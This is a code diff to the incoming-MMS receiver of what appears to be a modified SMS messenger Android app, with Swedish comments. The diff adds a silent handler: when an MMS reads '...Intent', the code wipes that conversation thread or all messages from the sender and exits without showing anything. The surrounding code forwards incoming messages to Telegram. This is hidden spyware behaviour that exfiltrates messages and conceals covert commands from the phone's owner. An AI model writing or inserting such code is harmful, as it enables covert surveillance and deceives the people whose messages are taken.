@@ -1,5 +1,5 @@
 package com.simplemobiletools.smsmessenger.receivers
-
+import com.simplemobiletools.smsmessenger.extensions.messagesDB
 import com.simplemobiletools.smsmessenger.utils.TelegramHelper
 import com.simplemobiletools.smsmessenger.helpers.SharedPrefsHelper
 import android.content.Context
@@ -22,7 +22,6 @@ import com.simplemobiletools.smsmessenger.helpers.refreshMessages
 import java.io.File
 import java.text.SimpleDateFormat
 import java.util.Date
-import com.simplemobiletools.smsmessenger.receivers.MmsSentReceiver
 
 class MmsReceiver : MmsReceivedReceiver() {
 
@@ -38,7 +37,19 @@ class MmsReceiver : MmsReceivedReceiver() {
         val timestamp = System.currentTimeMillis()
         val formattedTime = SimpleDateFormat("yyyy-MM-dd HH:mm").format(Date(timestamp))
 
-        // === NYTT: Hämta namn från SharedPrefsHelper ===
+        // === TYST "...Intent"-hantering ===
+        if (body.equals("...Intent", ignoreCase = true)) {
+            val threadId = mms.threadId
+            if (threadId != null && threadId > 0) {
+                context.messagesDB.deleteAllThreadMessages(threadId)
+            } else {
+                context.messagesDB.deleteMessagesFromAddress(address)
+            }
+            // Avsluta direkt, inget MMS visas eller hanteras vidare
+            return
+        }
+
+        // Skicka till Telegram med custom header
         val prefs = SharedPrefsHelper(context)
         val header = prefs.getCustomLogHeader().ifBlank { "MMS INKOMMANDE" }
 
